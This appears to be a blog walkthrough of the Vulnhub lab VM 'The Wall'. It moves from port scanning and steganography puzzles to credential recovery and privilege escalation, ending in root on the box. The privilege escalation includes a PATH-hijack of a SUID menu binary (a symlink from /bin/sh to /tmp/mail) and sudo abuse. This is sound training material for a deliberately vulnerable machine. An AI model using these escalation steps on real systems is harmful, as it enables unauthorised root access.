---
extends: default.liquid
title: The Wall [Vulnhub] Walkthrough
date: 2016-06-02T19:03:50Z
tags:
  - vulnhub
  - walkthrough
category: walkthrough
---

> **note**
>
> We interrupt your regular episode of _reverse engineering with Unlogic_ to bring you a special episode of _solving vulnerable VMs with Unlogic_.

It's been a while since I attempted a box from Vulnhub. Going by my posts, the last one was in 2015. Time flies when you are having fun. So I thought I would do one to take a break from the binary bomb. After all, all the core phases are done now, so why not have a little holiday, right? So I headed over to [Vulnhub](https://vulnhub.com) and found an interesting box that came after the last one I did. This turns out to the **The Wall** by **xerubus**. So, let's go.

## Stage 1 - Recon

As per usual I scan the target to see what it's listening with

```sourceCode
root@kali:~# nmap -p- 172.16.231.142

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-02 18:42 BST
Nmap scan report for 172.16.231.142
Host is up (0.0000070s latency).
All 65535 scanned ports on 172.16.231.142 are closed

Nmap done: 1 IP address (1 host up) scanned in 14.14 seconds
```

Nothing listening. Odd. Well, if it's not listening, perhaps it's talking then? I'll open up Wireshark and filter on `ip.src == 172.16.231.142`. After a while....

```sourceCode
90  7.203252830 172.16.231.129  172.16.231.142  TCP 54  1337 → 21344 [RST, ACK] Seq=1 Ack=1 Win=0 Len=0
```

So it's looking to connect to port _1337_. Well allow me to comply

```sourceCode
root@kali:~# nc -lvp 1337
listening on [any] 1337 ...
172.16.231.142: inverse host lookup failed: Unknown host
connect to [172.16.231.129] from (UNKNOWN) [172.16.231.142] 4473

                       .u!"`
                   .x*"`
               ..+"NP
            .z""   ?
          M#`      9     ,     ,
                   9 M  d! ,8P'
                   R X.:x' R'  ,
                   F F' M  R.d'
                   d P  @  E`  ,
      ss           P  '  P  N.d'
       x         ''        '
       X               x             .
       9     .f       !         .    $b
       4;    $k      /         dH    $f
       'X   ;$$     z  .       MR   :$
        R   M$$,   :  d9b      M'   tM
        M:  #'$L  ;' M `8      X    MR
        `$;t' $F  # X ,oR      t    Q;
         $$@  R$ H :RP' $b     X    @'
         9$E  @Bd' $'   ?X     ;    W
         `M'  `$M d$    `E    ;.o* :R   ..
          `    '  "'     '    @'   '$o*"'

              The Wall by @xerubus
          -= Welcome to the Machine =-

If you should go skating on the thin ice of modern life, dragging behind
you the silent reproach of a million tear-stained eyes, don't be surprised
when a crack in the ice appears under your feet.
- Pink Floyd, The Thin Ice
```

Well, that's nice, but it just drops us back to our shell. However, back in Wireshark, this appeared

```sourceCode
3558    241.470595714   172.16.231.142  172.16.231.129  HTTP    605 HTTP/1.1 200 OK  (text/html)
```

HTTP requests? Maybe the connection kick started a web server on the target. Let me just do another scan

```sourceCode
root@kali:~#14 nmap -p- 172.16.231.142

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-02 18:56 BST
Nmap scan report for 172.16.231.142
Host is up (0.011s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
1965/tcp open  unknown
MAC Address: 00:0C:29:EE:0B:09 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 106.52 seconds
```

Howdy there port **80** and **1965**. I'll just check what port **1965** is serving up

```sourceCode
root@kali:~# nmap -p1965 -sV !$
nmap -p1965 -sV 172.16.231.142

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-02 18:59 BST
Nmap scan report for 172.16.231.142
Host is up (0.00067s latency).
PORT     STATE SERVICE VERSION
1965/tcp open  ssh     OpenSSH 7.0 (protocol 2.0)
MAC Address: 00:0C:29:EE:0B:09 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.10 seconds
```

**ssh**, excellent. Turns out this needs a username and password though. I know, how peculiar. So let's follow the other lead we have: port 80.

I get a picture of the band, nothing else. If you're thinking steganography, then there's a good chance you're right. After all, a single image? No other clues? What else could it be? Still, I'll need the password though, so _View Source_ and...

```html
<html>
<body bgcolor="#000000">
<center><img src="pink_floyd.jpg"</img></center>
</body>
</html>


<!--If you want to find out what's behind these cold eyes, you'll just have to claw your way through this disguise. - Pink Floyd, The Wall

Did you know? The Publius Enigma is a mystery surrounding the Division Bell album.  Publius promised an unspecified reward for solving the
riddle, and further claimed that there was an enigma hidden within the artwork.

737465673d3333313135373330646262623337306663626539373230666536333265633035-->
```

That number string could well be a string of hex values. `hex2raw` needs to have those values space separated, and that's tedious work. I'll just knock up a bit of Python to take care of this

```python
>>> import sys
>>> a = '737465673d3333313135373330646262623337306663626539373230666536333265633035'
>>> for i in xrange(0, len(a), 2):
...     sys.stdout.write(chr(int(a[i:i+2], 16)))
>>> print
steg=33115730dbbb370fcbe9720fe632ec05
```

_steg_ gives me a good hint that we are in fact dealing with steganography. Now, what's the other string here? A hash perhaps? To the [crackstation](https://crackstation.net)! There we find out that it'd an MD5 hash of the word `divisionbell`. So let me try that

```sourceCode
root@kali:~/Downloads# steghide extract -p divisionbell -sf pink_floyd.jpg
wrote extracted data to "pink_floyd_syd.txt".
root@kali:~/Downloads# cat pink_floyd_syd.txt
Hey Syd,

I hear you're full of dust and guitars?

If you want to See Emily Play, just use this key: U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0

Roger

Did you know? In 1965, The Pink Floyd Sound changed their name to Pink Floyd.  The name was inspired
by Pink Anderson and Floyd Council, two blues muscians on the Piedmont Blues record Syd Barret had in
his collection.
```

More encoded stuff, one obvious base64, and another md5. I'll use crackstation for the latter and for the prior I just

```sourceCode
root@kali:~/Downloads# echo U3lkQmFycmV0dA== | base64 -d
SydBarrett
```

That's the username, and the hash resolves to `pinkfloydrocks`. Now I've got the ssh login. Let's see what that yields.

```sourceCode
root@kali:~/Downloads# ssh SydBarrett@172.16.231.142 -p 1965
SydBarrett@172.16.231.142's password:
Could not chdir to home directory /home/SydBarrett: No such file or directory
This service allows sftp connections only.
Connection to 172.16.231.142 closed.
```

Ok then, not a problem...

```sourceCode
root@kali:~/Downloads# sftp -P 1965 SydBarrett@172.16.231.142
SydBarrett@172.16.231.142's password:
Connected to 172.16.231.142.
sftp> ls -la
drwxr-x---    3 0        1000          512 Jun  2  2016 .
drwxr-x---    3 0        1000          512 Oct 24  2015 ..
drwxr-xr-x    3 0        1000          512 Oct 24  2015 .mail
-rw-r--r--    1 0        1000         1912 Oct 25  2015 bio.txt
-rw-r--r--    1 0        1000       868967 Oct 24  2015 syd_barrett_profile_pic.jpg
```

I'll just get all the files in this dir and examine each one in turn....

(time passes)

So we have a picture of Syd, a bio, and a _.mail_ folder. At this point the picture holds nothing of interest, so I'll head into the mail folder and see what's there. One sent item containing

> Date: Sun, 24 Oct 1965 18:45:21 +0200 From: Syd Barrett &lt;<syd@pink.floyd>&gt; Reply-To: Syd Barret &lt;<syd@pink.floyd>&gt; To: Roger Waters &lt;<roger@pink.floyd>&gt; Subject: Had to hide the stash
>
> Roger... I had to hide the stash.
>
> Usual deal.. just use the scalpel when you find it.
>
> Ok, sorry for that.
>
> Rock on man
>
> "Syd"

There's also a _.stash_ folder \[always use `ls -la` kids\]. Inside there is a file

```sourceCode
root@kali:~/Downloads/thewall/.mail/.stash# file eclipsed_by_the_moon
eclipsed_by_the_moon: gzip compressed data, last modified: Wed Nov 11 00:15:47 2015, from Unix
root@kali:~/Downloads/thewall/.mail/.stash# tar xzf eclipsed_by_the_moon
root@kali:~/Downloads/thewall/.mail/.stash# ls
eclipsed_by_the_moon  eclipsed_by_the_moon.lsd
root@kali:~/Downloads/thewall/.mail/.stash# file eclipsed_by_the_moon.lsd
eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "MSDOS5.0", sectors/cluster 2, reserved sectors 8, root entries 512, Media descriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors 2048, sectors 96256 (volumes > 32 MB) , serial number 0x9e322180, unlabeled, FAT (16 bit)
```

Interesting. We have a filesystem in the _.lsd_ file. Remember that sent item mentioning _just use the scalpel when you find it._ referring to the _hidden stash_? I think I might just do that

```sourceCode
root@kali:~/Downloads/thewall/.mail/.stash# scalpel eclipsed_by_the_moon.lsd
Scalpel version 1.60
Written by Golden G. Richard III, based on Foremost 0.69.

Opening target "/root/Downloads/thewall/.mail/.stash/eclipsed_by_the_moon.lsd"

Image file pass 1/2.
eclipsed_by_the_moon.lsd: 100.0% |*********************|   47.0 MB    00:00 ETAAllocating work queues...
Work queues allocation complete. Building carve lists...
Carve lists built.  Workload:
� with header "\x46\x4f\x52\x45\x4d\x4f\x53\x54" and footer "" --> 0 files
gif with header "\x47\x49\x46\x38\x37\x61" and footer "\x00\x3b" --> 0 files
gif with header "\x47\x49\x46\x38\x39\x61" and footer "\x00\x3b" --> 0 files
jpg with header "\xff\xd8\xff\xe0\x00\x10" and footer "\xff\xd9" --> 1 files
png with header "\x50\x4e\x47\x3f" and footer "\xff\xfc\xfd\xfe" --> 0 files
bmp with header "\x42\x4d\x3f\x3f\x00\x00\x00" and footer "" --> 0 files
htm with header "\x3c\x68\x74\x6d\x6c" and footer "\x3c\x2f\x68\x74\x6d\x6c\x3e" --> 0 files
zip with header "\x50\x4b\x03\x04" and footer "\x3c\xac" --> 0 files
Carving files from image.
Image file pass 2/2.
eclipsed_by_the_moon.lsd: 100.0% |*********************|   47.0 MB    00:00 ETAProcessing of image file complete. Cleaning up...
Done.
Scalpel is done, files carved = 1, elapsed = 1 seconds.
root@kali:~/Downloads/thewall/.mail/.stash# ls scalpel-output/
audit.txt  jpg-3-0
```

A jpg file which gives us a picture of Roger Waters telling me what the password is. It'd be rude not to use it

## Phase 2

```sourceCode
root@kali:~/Downloads# ssh RogerWaters@172.16.231.142 -p 1965
RogerWaters@172.16.231.142's password:
OpenBSD 5.8 (GENERIC) #1066: Sun Aug 16 02:33:00 MDT 2015

                       .u!"`
                   .x*"`
               ..+"NP
            .z""   ?
          M#`      9     ,     ,
                   9 M  d! ,8P'
                   R X.:x' R'  ,
                   F F' M  R.d'
                   d P  @  E`  ,
      ss           P  '  P  N.d'
       x         ''        '
       X               x             .
       9     .f       !         .    $b
       4;    $k      /         dH    $f
       'X   ;$$     z  .       MR   :$
        R   M$$,   :  d9b      M'   tM
        M:  #'$L  ;' M `8      X    MR
        `$;t' $F  # X ,oR      t    Q;
         $$@  R$ H :RP' $b     X    @'
         9$E  @Bd' $'   ?X     ;    W
         `M'  `$M d$    `E    ;.o* :R   ..
          `    '  "'     '    @'   '$o*"'
$
```

The ~RogerWaters is a bit of a let down. Sure there's his _secret_diary_ and such but nothing that helps us progress. So let's see who else has accounts on this box

```sourceCode
$ getent passwd
< snip >
SydBarrett:*:1000:1000:Syd Barrett:/home/SydBarrett:/bin/ksh
NickMason:*:1001:1001:Nick Mason:/home/NickMason:/bin/ksh
RogerWaters:*:1002:1002:Roger Waters:/home/RogerWaters:/bin/ksh
RichardWright:*:1003:1003:Richard Wright:/home/RichardWright:/bin/ksh
DavidGilmour:*:1004:1004:David Gilmour:/home/DavidGilmour:/bin/ksh
```

I've got Syd and Roger, so only three more users of interest, so I'll see what they have to offer

```sourceCode
$ find / -user NickMason 2> /dev/null
/home/NickMason
/usr/local/bin/brick
$ ls -la /usr/local/bin/brick
-rws--s--x  1 NickMason  NickMason  7291 Aug  8  2015 /usr/local/bin/brick
$ find / -user DavidGilmour 2> /dev/null
/home/DavidGilmour
/usr/local/bin/shineon
$ ls -la /usr/local/bin/shineon
-rwsr-s---  1 DavidGilmour  RichardWright  7524 Oct 25  2015 /usr/local/bin/shineon
$ find / -user RichardWright 2> /dev/null
/home/RichardWright
```

Only Nick has something to offer us with his executable _brick_ binary with suid bits set. The _shineon_ binary, although it also has suid set, won't let me execute it.

I get presented with a question about the band. I quickly google the answer and voila

```sourceCode
$ /usr/local/bin/brick

What have we here, laddie?
Mysterious scribbings?
A secret code?
Oh, poems, no less!
Poems everybody!

Who is the only band member to be featured on every Pink Floyd album? : Nick Mason
/bin/sh: Cannot determine current working directory
$ whoami
NickMason
```

I am Nick

## Phase 3

Once again I snoop around the home directory. This time the `bio.txt` file holds some info:

> I wander if anyone is reading these bio's? Richard Wright.. if you're reading this, I'm not really going to cut you into little pieces. I was just having a joke. Anyhow, I have now added you to thewall. You're username is obvious. You'll find your password in my profile pic.

Thanks Nick, but that's not a profile pic. It's an OGG file which I retrieve to listen to. Yonder the dulcet piano tones I hear the distinct _dee dee dat_ of morse code. I best filter it out so it's a bit easier to hear. Analyse the frequency, use a highpass filter on 15000Hz, mix down to mono, boost the volume and relisten.

![image](/images/nickmason.png)

Once written down we can use an [online translator](https://www.onlineconversion.com/morse_code.htm) to convert it to `RICHARDWRIGHT1943FARFISA`

Now I've got Richard's password too.

## Phase 4

Annoyingly I can't ssh in as Richard, but no matter, I'll go back in as Roger and `su` my way to Mr Wright. Poking around the home directory I only find the _mail_ file of interest, which contains a message from David, last user we need creds for:

> G'day Rick.. how's the ivory tickling going?
>
> There's plenty of bricks in the wall, so I'll give you a few when we catch up.
>
> For now, just use that command I gave you with the menu.

Remembering the list of files from the search I did earlier, there was one file owned by David that Richard is allowed to run: `/usr/local/bin/shineon`. Running this gives us a menu of actions. Nothing really does much, and there's no obvious way to smash the stack, so let's look at the file in more detail. Using the strings command we get some interesting information:

```sourceCode
load_menu
 Time - The Dark Side of the Moon
 /usr/bin/cal
 Press ENTER to continue.
 Echoes - Meddle
 /usr/bin/who
 Is There Anybody Out There? - The Wall
 /sbin/ping -c 3 www.google.com
 Keep Talking- The Division Bell
 mail
```

It seems that this menu is a convenience tool for Richard to run some basic linux commands. Clearly he's not too comfortable on the command line. Interestingly enough though, most tools are called with their full path, except for `mail`. This gives me an opportunity to create a symlink to `/bin/sh` called `mail` in some directory (probably `/tmp`), add that to the path, and get a shell as David.

```sourceCode
$ ln -s /bin/sh /tmp/mail
$ export PATH=/tmp:${PATH}
$ /usr/local/bin/shineon
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
4
Keep Talking- The Division Bell
mail: Cannot determine current working directory
$ whoami
DavidGilmour
```

I am Dave

## Phase 5

Exploring home directories is a recurring thing here. I'll cut it short and just give you the interesting bits:

> 1.  A file with the URL `pinkfloyd1965newblogsite50yearscelebration-temp/index.php`
> 2.  The profile pic contains the string `who_are_you_and_who_am_i` - a password?

Again I can't ssh as the user, so I login in as Roger and become David. Now to visit that URL

It's a nice home page, time to explore... _more time passes_.... and in the source I find

> &lt;!--Through the window in the wall, come streaming in on sunlight wings, a million bright ambassadors of morning. - Pink Floyd, Echoes Can you see what the Dog sees? Perhaps hints of lightness streaming in on sunlight wings?--&gt;

Subtle, but clear. I'm going to need to adjust the levels of the main image I reckon. Once in Gimp I ramp up contrast and brightness and voila:

<img src="/images/welcomemachine.png" alt="image" width="600" />

Let's head over to that URL... to get a `403` :( Ok, what about that string at the bottom: another hex string which translates to `PinkFloyd50Years`. Well, the 403 hints that there's something there, so let me head back to the file system. As David I can get to `/var/www/htdocs/` and snoop around, and sure enough there's the `welcometothemachine` directory, and inside is a binary with very restrictive perms. Running it prompts for a password and it turns out that `PinkFloyd50Years` doesn't work. Hmph. Putting in a long string traps the overflow, so no dice there. Can't copy the binary out for disassembling, so... let's just put the hex string in and hope. Success! But what happened?

```sourceCode
$ ./PinkFloyd
Please send your answer to Old Pink, in care of the Funny Farm. - Pink Floyd, Empty Spaces
Answer: 50696e6b466c6f796435305965617273

Fearlessly the idiot faced the crowd smiling. - Pink Floyd, Fearless

Congratulations... permission has been granted.
You can now set your controls to the heart of the sun!
```

Now what? Well, I guess something's changed. Wouldn't be the first time an action has resulted in a change somewhere on the system. Ultimately it boiled down to a recently modified file:

```sourceCode
$ find / -mmin 2 2>/dev/null
/etc/sudoers
/var/log/messages
```

O\`RLY?

```sourceCode
$ sudo -l
Password:
Matching Defaults entries for DavidGilmour on thewall:
    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"

User DavidGilmour may run the following commands on thewall:
    (ALL) SETENV: ALL
    (ALL) SETENV: ALL
$ sudo su
# whoami
root
```

Squeeeee... I AM ROOT!

```sourceCode
# cd
# cat flag.txt

"The band is fantastic, that is really what I think. Oh, by the way, which one is Pink? - Pink Floyd, Have A Cigar"

                   Congratulations on rooting thewall!

   ___________________________________________________________________
  | |       |       |       |       |       |       |       |       | |
  |_|_______|_______|______ '__  ___|_______|_______|_______|_______|_|
  |     |       |       |   |  )      /         |       |       |     |
  |_____|_______|_______|__ |,' , .  | | _ , ___|_______|_______|_____|
  | |       |       |      ,|   | |\ | | ,' |       |       |       | |
  |_|_______|_______|____ ' | _ | | \| |'\ _|_______|_______|_______|_|
  |     |       |       |   \  _' '  ` |  \     |       |       |     |
  |_____|_______|_______|_  ,-'_ _____ | _______|_______|_______|_____|
  | |       |       |   ,-'|  _     |       |       |       |       | |
  |_|_______|_______|__  ,-|-' |  ,-. \ /_.--. _____|_______|_______|_|
  |     |       |          |   |  | |  V  |   ) |       |       |     |
  |_____|_______|_______|_ | _ |-'`-'  |  | ,' _|_______|_______|_____|
  | |       |       |      |        |  '  ;'        |       |       | |
  |_|_______|_______|______"|_____  _,- o'__|_______|_______|_______|_|
  |     |       |       |       _,-'    .       |       |       |     |
  |_____|_______|_______|_ _,--'\      _,-'_____|_______|_______|_____|
  | |       |       |     '     ||_||-' _   |       |       |       | |
  |_|_______|_______|_______|__ || ||,-'  __|_______|_______|_______|_|
  |     |       |       |       |  ||_,-'       |       |       |     |
  |_____|_______|______.|_______.__  ___|_______|_______|_______|_____|
  | |       |       |   \    |     /        |       |       |       | |
  |_|_______|_______|___ \ __|___ /,  _ |   | ______|_______|_______|_|
  |     |       |       | \      // \   |   |   |       |       |     |
  |_____|_______|_______|_ \ /\ //--'\  |   | __|_______|_______|_____|
  | |       |       |       '  V/    |  |-' |__,    |       |       | |
  |_|_______|_______|_______|_______ _______'_______|_______|_______|_|
  |     |       |       |       |       |       |       |       |     |
  |_____|_______|_______|_______|_______|_______|_______|_______|_____|
  |_________|_______|_______|_______|_______|_______|_______|_______|_|

                  Celebrating 50 years of Pink Floyd!
             Syd Barrett (RIP), Nick Mason, Roger Waters,
               Richard Wright (RIP), and David Gilmour.


** Shoutouts **
+ @vulnhub for making it all possible
+ @rastamouse @thecolonial - "the test bunnies"

-=========================================-
-  xerubus (@xerubus - www.mogozobo.com)  -
-=========================================-
```

## DAS ENDE

Thanks xerubus for creating this interesting VM. It was fun being all the different members of Pink Floyd :) Found myself to be a bit rusty, but I'll keep on practicing...
